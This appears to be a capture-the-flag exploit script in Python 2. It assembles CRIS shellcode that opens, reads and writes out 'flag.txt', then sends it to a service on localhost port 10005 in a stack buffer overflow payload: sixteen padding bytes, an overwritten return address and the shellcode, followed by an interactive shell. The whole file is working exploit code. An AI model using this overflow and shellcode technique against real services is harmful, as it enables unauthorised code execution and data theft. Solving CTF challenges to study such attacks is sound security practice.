asm = '''.section .text
.global _start

.ascii "%s"
_start:
    move.d pc, r0
    addq 30, r0
open:
    move.d r0, r10
    clear.d r11
    clear.d r12
    moveq 5,r9
    break 13
read:
    move.d r0, r11
    moveq 31,r12
    moveq 3,r9
    break 13
write:
    moveq 0x1, r10
    move.d r0, r11
    moveq 31, r12
    moveq 4,r9
    break 13
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'cris'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10005
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1ada + 16 + 4
shellcode = 'A' * 16 + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
